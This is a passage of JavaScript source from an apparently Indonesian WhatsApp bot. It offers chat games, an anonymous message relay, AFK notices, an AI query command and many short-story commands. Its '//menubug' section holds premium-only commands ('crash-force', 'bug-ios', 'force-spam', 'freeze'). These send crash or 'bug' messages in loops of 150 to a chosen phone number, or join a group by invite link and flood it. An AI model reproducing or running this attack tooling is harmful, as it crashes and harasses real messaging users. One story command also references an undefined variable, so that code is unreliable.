				}
				roof.status = 'play';
				roof.asal = m.chat;
				clearTimeout(roof.waktu);
				m.reply(`Suit telah dikirimkan ke chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nSilahkan pilih suit di chat masing-masing klik https://wa.me/${botNumber.split`@`[0]}`, { quoted: fkontak1 })
				if (!roof.pilih) Xlesy.sendMessage(roof.p, { text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️` }, { quoted: fkontak1 })
				if (!roof.pilih2) Xlesy.sendMessage(roof.p2, { text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️` }, { quoted: fkontak1 })
				roof.waktu_milih = setTimeout(() => {
					if (!roof.pilih && !roof.pilih2) m.reply(`Kedua pemain tidak niat main,\nSuit dibatalkan`, { quoted: fkontak1 })
					else if (!roof.pilih || !roof.pilih2) {
						win = !roof.pilih ? roof.p2 : roof.p
						m.reply(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, { quoted: fkontak1 })
					}
					delete suit[roof.id]
					return !0
				}, roof.timeout)
			}
			let jwb = m.sender == roof.p
			let jwb2 = m.sender == roof.p2
			let g = /gunting/i
			let b = /batu/i
			let k = /kertas/i
			let reg = /^(gunting|batu|kertas)/i;
			
			if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
				roof.pilih = reg.exec(m.text.toLowerCase())[0];
				roof.text = m.text;
				m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`, { quoted: fkontak1 });
				if (!roof.pilih2) Xlesy.sendMessage(roof.p2, { text: '_Lawan sudah memilih_\nSekarang giliran kamu' })
			}
			if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
				roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
				roof.text2 = m.text
				m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`, { quoted: fkontak1 })
				if (!roof.pilih) Xlesy.sendMessage(roof.p, { text: '_Lawan sudah memilih_\nSekarang giliran kamu' })
			}
			let stage = roof.pilih
			let stage2 = roof.pilih2
			if (roof.pilih && roof.pilih2) {
				clearTimeout(roof.waktu_milih)
				if (b.test(stage) && g.test(stage2)) win = roof.p
				else if (b.test(stage) && k.test(stage2)) win = roof.p2
				else if (g.test(stage) && k.test(stage2)) win = roof.p
				else if (g.test(stage) && b.test(stage2)) win = roof.p2
				else if (k.test(stage) && b.test(stage2)) win = roof.p
				else if (k.test(stage) && g.test(stage2)) win = roof.p2
				else if (stage == stage2) tie = true
				db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
				db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
				Xlesy.sendMessage(roof.asal, { text: `_*Hasil Suit*_${tie ? '\nSERI' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}\n\nPemenang Mendapatkan\n*Hadiah :* Uang(3000) & Limit(3)`.trim(), mentions: [roof.p, roof.p2] }, { quoted: fkontak1 })
				delete suit[roof.id]
			}
		}
		
		// Tebak Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd && !isCreator) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				tebakbom[m.sender].pick++;
				Xlesy.sendMessage(m.chat, { react: {text: '❌', key: m.key }})
				tebakbom[m.sender].bomb--;
				tebakbom[m.sender].nyawa.pop();
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].nyawa.length < 1) {
					await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n_Pengurangan Limit : 1_`, { quoted: fkontak1 });
					Xlesy.sendMessage(m.chat, { react: { text: '😂', key: m.key }})
					delete tebakbom[m.sender];
				} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join('')}\n\nTerpilih: ${tebakbom[m.sender].pick}\nSisa nyawa: ${tebakbom[m.sender].nyawa}`, { quoted: fkontak1 });
				return !0;
			}
			if (tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				tebakbom[m.sender].pick++;
				tebakbom[m.sender].lolos--;
				let brd = tebakbom[m.sender].board;
				if (tebakbom[m.sender].lolos < 1) {
					db.users[m.sender].uang += 6000
					await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n*Sisa nyawa :* ${tebakbom[m.sender].nyawa}\n*Bomb :* ${tebakbom[m.sender].bomb}\nBonus Uang 💰 *+6000*`, { quoted: fkontak1 });
					delete tebakbom[m.sender];
				} else m.reply(`*PILIH ANGKA*\n\n${brd.join('')}\n\nTerpilih : ${tebakbom[m.sender].pick}\nSisa nyawa : ${tebakbom[m.sender].nyawa}\nBomb : ${tebakbom[m.sender].bomb}`, { quoted: fkontak1 })
			} 
		}
		
		// Akinator
		if (m.sender in akinator) {
			if (m.quoted && akinator[m.sender].key == m.quoted.id) {
				if (budy == '5') {
					if (akinator[m.sender]?.progress?.toFixed(0) == 0) {
						delete akinator[m.sender]
						return m.reply(`🎮 Akinator Game End!\nWith *0* Progress`, { quoted: fkontak1 })
					}
					akinator[m.sender].isWin = false
					await akinator[m.sender].cancelAnswer()
					let { key } = await m.reply(`🎮 Akinator Game Back :\n\n@${m.sender.split('@')[0]} (${akinator[m.sender].progress.toFixed(2)}) %\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n- 5 - ${akinator[m.sender]?.progress?.toFixed(0) == 0 ? 'End' : 'Back'}`, { quoted: fkontak1 })
					akinator[m.sender].key = key.id
				} else if (akinator[m.sender].isWin && ['benar', 'ya'].includes(budy.toLowerCase())) {
					Xlesy.sendMessage(m.chat, { react: { text: '🎊', key: m.key }})
					delete akinator[m.sender]
				} else {
					if (!isNaN(budy) && budy.match(/^[0-4]$/) && budy) {
						if (akinator[m.sender].isWin) {
							let { key } = await m.reply({ image: { url: akinator[m.sender].sugestion_photo }, caption: `🎮 Akinator Answer :\n\n@${m.sender.split('@')[0]}\nDia adalah *${akinator[m.sender].sugestion_name}*\n_${akinator[m.sender].sugestion_desc}_\n\n- 5 - Back\n- *Ya* (untuk keluar dari sesi)`, contextInfo: { mentionedJid: [m.sender] }});
							akinator[m.sender].key = key.id
						} else {
							await akinator[m.sender].answer(budy)
							if (akinator[m.sender].isWin) {
								let { key } = await m.reply({ image: { url: akinator[m.sender].sugestion_photo }, caption: `🎮 Akinator Answer :\n\n@${m.sender.split('@')[0]}\nDia adalah *${akinator[m.sender].sugestion_name}*\n_${akinator[m.sender].sugestion_desc}_\n\n- 5 - Back\n- *Ya* (untuk keluar dari sesi)`, contextInfo: { mentionedJid: [m.sender] }});
								akinator[m.sender].key = key.id
							} else {
								let { key } = await m.reply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]} (${akinator[m.sender].progress.toFixed(2)}) %\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n- 5 - Back`, { quoted: fkontak1 })
								akinator[m.sender].key = key.id
							}
						}
					}
				}
			}
		}
		
		// Game
		const games = { tebaklirik, tekateki, tebaklagu, tebakkata, kuismath, susunkata, tebakkimia, caklontong, tebakangka, tebaknegara, tebakgambar, tebakbendera }
		for (let gameName in games) {
			let game = games[gameName];
			let id = iGame(game, m.chat);
			if (m.quoted && id == m.quoted.id) {
				if (gameName == 'kuismath') {
					jawaban = game[m.chat + id].jawaban
					const difficultyMap = { 'noob': 1, 'easy': 1.5, 'medium': 2.5, 'hard': 4, 'extreme': 5, 'impossible': 6, 'impossible2': 7 };
					let randMoney = difficultyMap[kuismath[m.chat + id].mode]
					if (!isNaN(budy)) {
						if (budy.toLowerCase() == jawaban) {
							db.users[m.sender].uang += randMoney * 1000
							await m.reply(`Jawaban Benar 🎉\nBonus Uang 💰 *+${randMoney * 1000}*`, { quoted: fkontak1 })
							delete kuismath[m.chat + id]
						} else m.reply('*Jawaban Salah!*')
					}
				} else {
					jawaban = game[m.chat + id].jawaban
					let jawabBenar = /tekateki|tebaklirik|tebaklagu|tebakkata|tebaknegara|tebakbendera/.test(gameName) ? (similarity(budy.toLowerCase(), jawaban) >= almost) : (budy.toLowerCase() == jawaban)
					let bonus = gameName == 'caklontong' ? 9999 : gameName == 'tebaklirik' ? 4299 : gameName == 'susunkata' ? 2989 : 3499
					if (jawabBenar) {
						db.users[m.sender].uang += bonus * 1
						await m.reply(`Jawaban Benar 🎉\nBonus Uang 💰 *+${bonus}*`, { quoted: fkontak1 })
						delete game[m.chat + id]
					} else m.reply('*Jawaban Salah!*')
				}
			}
		}
		
		// Family 100
		if (m.chat in family100) {
			if (m.quoted && m.quoted.id == family100[m.chat].id && !isCmd) {
				let room = family100[m.chat]
				let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
				let isSurender = /^((me)?nyerah|surr?ender)$/i.test(teks)
				if (!isSurender) {
					let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
					if (room.terjawab[index]) return !0
					room.terjawab[index] = m.sender
				}
				let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
				let caption = `Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}\n${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}\n${Array.from(room.jawaban, (jawaban, index) => { return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false }).filter(v => v).join('\n')}\n${isSurender ? '' : `Perfect Player`}`.trim()
				m.reply(caption)
				if (isWin || isSurender) delete family100[m.chat]
			}
		}
		
		// Menfes
		if (!m.isGroup) {
			if (menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}
					const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}}} : { [m.type]: m.msg }
					await Xlesy.relayMessage(menfes[m.sender].tujuan, pesan, {});
				}
			}
		}
		
		// Afk
		let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		for (let jid of mentionUser) {
			let user = db.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			m.reply(`Jangan tag dia!\nDia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\nSelama ${clockString(new Date - afkTime)}`.trim(), { quoted: fkontak1 })
		}
		if (db.users[m.sender].afkTime > -1) {
			let user = db.users[m.sender]
			m.reply(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}\nSelama ${clockString(new Date - user.afkTime)}`, { quoted: fkontak1 })
			user.afkTime = -1
			user.afkReason = ''
		}		
	//add case
	
		switch(command) {
case 'gpt': {  
    if (!text) return m.reply(`Example: ${prefix + command} query`, { quoted: fkontak1 });  
    try {  
        let response = await axios.get(`https://api.agungny.my.id/api/aiLogic?q=jawab%20dengan%20bahasa%indonesia${encodeURIComponent(text)}`);  
        m.reply(response.data.result);  
    } catch (e) {  
        try {  
            let hasil = await youSearch(text);  
            m.reply(hasil);  
        } catch (e) {  
            try {  
                let hasil = await bk9Ai(text);  
                m.reply(hasil.BK9);  
            } catch (e) {  
                m.reply(pickRandom([  
                    'Fitur Ai sedang bermasalah!',  
                    'Tidak dapat terhubung ke ai!',  
                    'Sistem Ai sedang sibuk sekarang!',  
                    'Fitur sedang tidak dapat digunakan!'  
                ]), { quoted: fkontak1 });  
            }  
        }  
    }  
}  
break;
		case 'githubtrend': {
		await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    try {
        let anu = 'https://api.agungny.my.id/api/ghtrending';
        let response = await fetch(anu);
        let data = await response.json();

        if (!data || !data.result || data.result.length === 0) {
            return m.reply('Gagal mengambil data GitHub Trending!');
        }

        let hasil = '*🔥 GitHub Trending 🔥*\n\n';
        data.result.slice(0, 5).forEach((repo, i) => {
            hasil += `*${i + 1}. ${repo.name}*\n`;
            hasil += `📌 Deskripsi: ${repo.description || 'Tidak ada deskripsi'}\n`;
            hasil += `⭐ Stars: ${repo.stars}\n`;
            hasil += `🍴 Forks: ${repo.forks}\n`;
            hasil += `👤 Author: ${repo.author}\n`;
            hasil += `🔗 URL: ${repo.url}\n\n`;
        })

        m.reply(hasil, { quoted: fkontak1 })
    } catch (e) {
        console.error(e);
        m.reply('Terjadi kesalahan saat mengambil data GitHub Trending!', { quoted: fkontak1 })
    }
}
break;
	//menubug
	case 'crash-force': {
if (!isPremium) return m.reply("only premium access", { quoted: fkontak1 })
if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, { quoted: fkontak1 })
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`success send bug to ${Pe}`, { quoted: fkontak1 })
for (let r = 0; r < 150; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'bugs-force': {
if (!isPremium) return m.reply("only premium access", { quoted: fkontak1 })
if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, { quoted: fkontak1 })
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`success send bug to ${Pe}`, { quoted: fkontak1 })
for (let r = 0; r < 150; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'force-ui': {
if (!isPremium) return m.reply("only premium access", { quoted: fkontak1 })
if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, { quoted: fkontak1 })
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`success send bug to ${Pe}`, { quoted: fkontak1 })
for (let r = 0; r < 150; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'bug-ios': {
if (!isPremium) return m.reply("only premium access", { quoted: fkontak1 })
if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, { quoted: fkontak1 })
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`success send bug to ${Pe}`, { quoted: fkontak1 })
await KillIos(Pe)
}
break

case 'force-spam': {
if (!isPremium) return m.reply("only premium access", { quoted: fkontak1 })
if (!q) return m.reply(`Example Use:\n ${prefix + command} 62xxx`, { quoted: fkontak1 })
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`success send bug to ${Pe}`, { quoted: fkontak1 })
for (let r = 0; r < 150; r++) {
await DocCursor(Pe)
await MSGSPAM(Pe)
await NativeC(Pe)
}
}
break
case 'freeze': {
    if (!isPremium) return m.reply("Features can be accessed by Premium only", { quoted: fkontak1 });
    if (!q) return m.reply(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/xxxxxx atau ${prefix + command} 123456789@g.us`, { quoted: fkontak1 });

    let groupId;
    
    // Cek apakah input berupa link grup atau langsung ID grup
    if (q.includes("https://chat.whatsapp.com/")) {
        let result = q.split("https://chat.whatsapp.com/")[1];
        groupId = await Xlesy.groupAcceptInvite(result); // Join grup dan ambil ID grup
    } else {
        groupId = q; // Jika input langsung berupa ID grup
    }

    // Ambil info grup untuk cek apakah grup sedang di-mute
    let groupMetadata = await Xlesy.groupMetadata(groupId);
    if (groupMetadata.announce) { // Jika announce = true, berarti grup sedang di-mute
        return m.reply("❌ Gagal! Bot tidak bisa mengirim pesan karena grup sedang di-mute oleh admin.", { quoted: fkontak1 });
    }

    await sleep(1000);
    m.reply(`Success send bug to ${groupId}`, { quoted: fkontak1 });

    // Kirim bug beberapa kali ke grup yang ditargetkan
    await Carousel(groupId);
    await Carousel(groupId);
    await Carousel(groupId);
}
break;
		
		//cerpen
case 'cerpen-anak':{
let hasil = await cerpen(`anak`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-bahasadaerah':{
let hasil = await cerpen(`bahasa daerah`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-bahasainggris':{
let hasil = await cerpen(`bahasa Inggris`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-bahasajawa':{
let hasil = await cerpen(`bahasa jawa`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-bahasasunda':{
let hasil = await cerpen(`bahasa sunda`, { quoted: fkontak1 })
m.reply(`
 ❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-budaya':{
let hasil = await cerpen(`budaya`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cinta':{
let hasil = await cerpen(`cinta`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cintaislami':{
let hasil = await cerpen(`cinta islami`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cintapertama':{
let hasil = await cerpen(`cinta pertama`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cintaromantis':{
let hasil = await cerpen(`cinta romantis`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cintasedih':{
let hasil = await cerpen(`cinta sedih`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cintasegitiga':{
let hasil = await cerpen(`Cinta segitiga`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-cintasejati':{
let hasil = await cerpen(`cinta sejati`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-galau':{
let hasil = await cerpen(`galau`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-gokil':{
let hasil = await cerpen(`gokil`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-inspiratif':{
let hasil = await cerpen(`inspiratif`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-jepang':{
let hasil = await cerpen(`jepang`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-kehidupan':{
let hasil = await cerpen(`kehidupan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-keluarga':{
let hasil = await cerpen(`keluarga`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-kisahnyata':{
let hasil = await cerpen(`kisah nyata`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-korea':{
let hasil = await cerpen(`korea`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-kristen':{
let hasil = await cerpen(`kristen`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-liburan':{
let hasil = await cerpen(`liburan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-malaysia':{
let hasil = await cerpen(`malaysia`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-mengharukan':{
let hasil = await cerpen(`mengharukan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-misteri':{
let hasil = await cerpen(`misteri`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-motivasi':{
let hasil = await cerpen(`motivasi`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-nasihat':{
let hasil = await cerpen(`nasihat`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-nasionalisme':{
let hasil = await cerpen(`nasionalisme`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-olahraga':{
let hasil = await cerpen(`olahraga`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-patahhati':{
let cerpe = await cerpen(`patah hati`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-penantian':{
let hasil = await cerpen(`penantian`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-pendidikan':{
let hasil = await cerpen(`pendidikan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-pengalaman':{
let hasil = await cerpen(`pengalaman pribadi`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-pengorbanan':{
let hasil = await cerpen(`pengorbanan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, { quoted: fkontak1 })
}
break
case 'cerpen-penyesalan':{
let hasil = await cerpen(`penyesalan`, { quoted: fkontak1 })
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
